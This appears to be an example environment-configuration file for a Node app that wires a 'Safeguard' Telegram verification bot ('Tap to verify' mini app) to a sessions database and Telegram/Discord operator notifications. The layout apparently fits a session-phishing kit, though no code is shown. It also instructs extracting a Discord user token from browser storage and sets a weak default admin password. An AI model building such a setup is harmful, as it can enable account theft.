# ===========================================
# TELEGRAM BOT CONFIGURATION
# ===========================================
# Get your bot token from @BotFather on Telegram
TELEGRAM_BOT_TOKEN=your_bot_token_here

# Chat ID where notifications will be sent
# You can get this by messaging your bot and checking the logs, or use @userinfobot
TELEGRAM_CHAT_ID=your_chat_id_here

# ===========================================
# DISCORD CONFIGURATION
# ===========================================
# Discord Webhook Configuration
# Get your webhook URL from Discord channel settings > Integrations > Webhooks
DISCORD_WEBHOOK_URL=https://discord.com/api/webhooks/your_webhook_url_here

# Discord Bot Configuration (alternative to webhook)
# Get your bot token from Discord Developer Portal
DISCORD_BOT_TOKEN=your_discord_bot_token_here

# Discord Channel ID where notifications will be sent
DISCORD_CHANNEL_ID=your_discord_channel_id_here

# Discord User Token (for user-specific notifications)
# Get this from Discord Developer Tools > Application > Local Storage
DISCORD_USER_TOKEN=your_discord_user_token_here

# Discord User ID (for direct user notifications)
DISCORD_USER_ID=your_discord_user_id_here

# ===========================================
# NOTIFICATION CONFIGURATION
# ===========================================
# Notification Type Configuration
# Options: 'telegram', 'discord', or 'both'
NOTIFICATION_TYPE=telegram

# ===========================================
# SAFEGUARD BOT CONFIGURATION
# ===========================================
# Get your bot token from @BotFather on Telegram for the Safeguard bot
SAFEGUARD_BOT_TOKEN=your_safeguard_bot_token_here

# Web App URL for the mini app (where the "Tap to verify" button leads)
WEB_APP_URL=https://your-mini-app-url.com

# Server URL for webhook (where Telegram will send updates)
SERVER_URL=https://your-server.com

# ===========================================
# AUTHENTICATION CONFIGURATION
# ===========================================
# JWT Secret for authentication tokens
# Generate a strong secret key for production
JWT_SECRET=your-super-secret-jwt-key-change-in-production

# JWT Token expiration time
JWT_EXPIRES_IN=24h

# Default admin password (change after first login)
DEFAULT_ADMIN_PASSWORD=admin123

# ===========================================
# DATABASE CONFIGURATION
# ===========================================
# Database URL for Prisma
# For SQLite (default): file:./storage/sessions.db
# For PostgreSQL: postgresql://username:password@localhost:5432/database_name
# For MySQL: mysql://username:password@localhost:3306/database_name
DATABASE_URL=file:./storage/sessions.db

# ===========================================
# SERVER CONFIGURATION
# ===========================================
# Server port (default: 3000)
PORT=3000

# Node environment
# Options: 'development', 'production', 'test'
NODE_ENV=development

# ===========================================
# DEBUG CONFIGURATION
# ===========================================
# Debug logging (optional)
# Set to '*' for all debug logs, or specific module names
# DEBUG=*
